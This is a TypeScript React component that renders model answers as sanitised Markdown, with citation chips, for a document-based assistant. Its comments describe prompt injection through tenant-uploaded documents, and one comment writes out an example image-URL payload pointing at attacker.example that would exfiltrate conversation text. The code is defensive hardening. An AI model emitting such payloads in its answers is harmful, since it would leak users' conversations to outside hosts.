"use client";

import { Check, Copy } from "lucide-react";
import { useState, type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

import { copyText } from "./copy";

/**
 * Renders a model answer as formatted text.
 *
 * **This is model output built from tenant-uploaded documents, so it is
 * untrusted markup, and three rules keep it inert:**
 *
 * 1. `skipHtml` -- raw HTML in the answer is dropped, never rendered. There is
 *    no `rehype-raw` anywhere, and adding one would turn a poisoned document
 *    into script execution in an administrator's console.
 * 2. `urlTransform` allows `http:`, `https:` and `mailto:` and nothing else.
 *    `javascript:`, `data:` and relative URLs become an empty href, which the
 *    link renderer shows as plain text rather than a dead or dangerous link.
 * 3. External links open in a new tab with `noopener noreferrer`, so the
 *    linked page gets no handle on this window and no referrer from it.
 * 4. Images are rendered as their alt text and never fetched -- an image URL
 *    is the one markdown element a browser requests without a click, which
 *    makes it the classic channel for exfiltrating a conversation.
 *
 * Citation markers (`[1]`) are the one exception to "links go out": they are
 * rewritten to `#cite-1` before parsing and rendered as in-page chips that
 * point at the matching source card. Only labels the server actually offered
 * become chips; a `[9]` the model invented stays plain text, matching the
 * server's own rule that an unoffered citation is not a citation.
 */

const CITATION_HREF = "#cite-";

/** Turns each offered `[n]` into a chip link numbered by its *source card*,
 *  outside code.
 *
 *  `numbers` maps a citation label to the card holding it. Several labels
 *  often share one document (passages 1, 2 and 4 all from one page), so
 *  `[1][2][4]` becomes a single chip `1` -- the same chip three times would
 *  read as three sources. A label with no card (one the model invented)
 *  stays plain text.
 *
 *  Code spans and fences are left alone: `array[1]` in a code sample is an
 *  index, not a citation. The split is deliberately simple -- during streaming
 *  an unclosed fence can briefly misclassify the tail, and the next token
 *  corrects it. */
export function linkCitations(text: string, numbers: ReadonlyMap<string, string>): string {
  if (numbers.size === 0) return text;
  return text
    .split(/(```[\s\S]*?```|`[^`\n]*`)/g)
    .map((segment, i) =>
      i % 2 === 1
        ? segment
        : segment
            .replace(/\[(\d{1,3})\](?![(:])/g, (whole, n: string) => {
              const card = numbers.get(n);
              return card ? `[${card}](${CITATION_HREF}${card})` : whole;
            })
            // Adjacent chips for the same card collapse into one.
            .replace(/(\[(\d+)\]\(#cite-\2\))(?:\s*\[\2\]\(#cite-\2\))+/g, "$1"),
    )
    .join("");
}

function safeUrl(url: string): string {
  const trimmed = url.trim();
  if (trimmed.startsWith(CITATION_HREF)) return trimmed;
  return /^(https?:|mailto:)/i.test(trimmed) ? trimmed : "";
}

function CodeBlock({ children }: { children: ReactNode }) {
  const [copied, setCopied] = useState(false);
  let text = "";
  // The code element's own text -- read at click time from the rendered DOM
  // would include the button label, so it is taken from the React children.
  const collect = (node: ReactNode): void => {
    if (typeof node === "string" || typeof node === "number") text += String(node);
    else if (Array.isArray(node)) node.forEach(collect);
    else if (node && typeof node === "object" && "props" in node) {
      collect((node as { props: { children?: ReactNode } }).props.children);
    }
  };
  collect(children);

  return (
    <div className="group/code relative my-3 overflow-hidden rounded-lg border border-border bg-muted/60">
      <button
        type="button"
        aria-label={copied ? "Copied" : "Copy code"}
        title={copied ? "Copied" : "Copy code"}
        onClick={async () => {
          if (await copyText(text.replace(/\n$/, ""))) {
            setCopied(true);
            window.setTimeout(() => setCopied(false), 1500);
          }
        }}
        className="absolute top-1.5 right-1.5 rounded-md p-1.5 text-muted-foreground opacity-0 transition-opacity group-hover/code:opacity-100 hover:bg-background hover:text-foreground focus-visible:opacity-100"
      >
        {copied ? <Check className="size-3.5" /> : <Copy className="size-3.5" />}
      </button>
      <pre className="overflow-x-auto p-3 text-[0.8125rem] leading-relaxed [&>code]:bg-transparent [&>code]:p-0 [&>code]:text-[inherit]">
        {children}
      </pre>
    </div>
  );
}

export function Markdown({
  text,
  citationNumbers,
  citationTitles,
  onCitation,
}: {
  text: string;
  /** Offered label -> source card number. Only mapped labels become chips. */
  citationNumbers?: ReadonlyMap<string, string>;
  /** Card number -> title, for the chip's tooltip. */
  citationTitles?: ReadonlyMap<string, string>;
  onCitation?: (cardNumber: string) => void;
}) {
  const components: Components = {
    h1: ({ children }) => <h3 className="mt-5 mb-2 text-base font-semibold first:mt-0">{children}</h3>,
    h2: ({ children }) => <h3 className="mt-5 mb-2 text-[0.95rem] font-semibold first:mt-0">{children}</h3>,
    h3: ({ children }) => <h4 className="mt-4 mb-1.5 text-sm font-semibold first:mt-0">{children}</h4>,
    h4: ({ children }) => <h5 className="mt-3 mb-1 text-sm font-medium first:mt-0">{children}</h5>,
    p: ({ children }) => <p className="my-2.5 leading-7 first:mt-0 last:mb-0">{children}</p>,
    ul: ({ children }) => <ul className="my-2.5 list-disc space-y-1 pl-5 marker:text-muted-foreground">{children}</ul>,
    ol: ({ children }) => <ol className="my-2.5 list-decimal space-y-1 pl-5 marker:text-muted-foreground">{children}</ol>,
    li: ({ children }) => <li className="pl-1 leading-7">{children}</li>,
    strong: ({ children }) => <strong className="font-semibold text-foreground">{children}</strong>,
    blockquote: ({ children }) => (
      <blockquote className="my-3 border-l-2 border-border pl-3 text-muted-foreground">{children}</blockquote>
    ),
    hr: () => <hr className="my-4 border-border" />,
    // **Images are never loaded.** A prompt-injected answer can write
    // `![](https://attacker.example/?q=<conversation text>)`, and rendering
    // it as <img> would make the browser fetch that URL automatically --
    // leaking whatever the model put in it without anyone clicking anything.
    // The alt text is kept so no content silently disappears.
    img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
    table: ({ children }) => (
      <div className="my-3 overflow-x-auto rounded-lg border border-border">
        <table className="w-full border-collapse text-left text-[0.8125rem]">{children}</table>
      </div>
    ),
    thead: ({ children }) => <thead className="bg-muted/60">{children}</thead>,
    th: ({ children }) => <th className="border-b border-border px-3 py-2 font-medium">{children}</th>,
    td: ({ children }) => <td className="border-b border-border px-3 py-2 align-top last:border-0">{children}</td>,
    pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
    code: ({ children, className }) => (
      <code className={`rounded bg-muted px-1 py-0.5 font-mono text-[0.85em] ${className ?? ""}`}>
        {children}
      </code>
    ),
    a: ({ href, children }) => {
      if (href?.startsWith(CITATION_HREF)) {
        const label = href.slice(CITATION_HREF.length);
        const chip =
          "mx-0.5 inline-flex h-4 min-w-4 -translate-y-0.5 items-center justify-center rounded bg-primary/10 px-1 align-middle text-[0.65rem] font-semibold text-primary tabular-nums";
        // A chip is only a button where there is a source card to jump to;
        // elsewhere (a reopened thread) a button that does nothing would
        // announce an action to a screen reader and then not take it.
        if (!onCitation) {
          return (
            <span className={chip} title={citationTitles?.get(label) ?? `Source ${label}`}>
              {label}
            </span>
          );
        }
        return (
          <button
            type="button"
            onClick={() => onCitation?.(label)}
            aria-label={`Source ${label}${citationTitles?.get(label) ? `: ${citationTitles.get(label)}` : ""}`}
            title={citationTitles?.get(label)}
            className="mx-0.5 inline-flex h-4 min-w-4 -translate-y-0.5 items-center justify-center rounded bg-primary/10 px-1 align-middle text-[0.65rem] font-semibold text-primary tabular-nums hover:bg-primary/20"
          >
            {label}
          </button>
        );
      }
      if (!href) return <span>{children}</span>;
      return (
        <a
          href={href}
          target="_blank"
          rel="noopener noreferrer nofollow"
          className="font-medium text-primary underline decoration-primary/30 underline-offset-2 hover:decoration-primary"
        >
          {children}
        </a>
      );
    },
  };

  return (
    <div className="text-sm break-words text-foreground/90">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        skipHtml
        urlTransform={safeUrl}
        components={components}
      >
        {citationNumbers ? linkCitations(text, citationNumbers) : text}
      </ReactMarkdown>
    </div>
  );
}
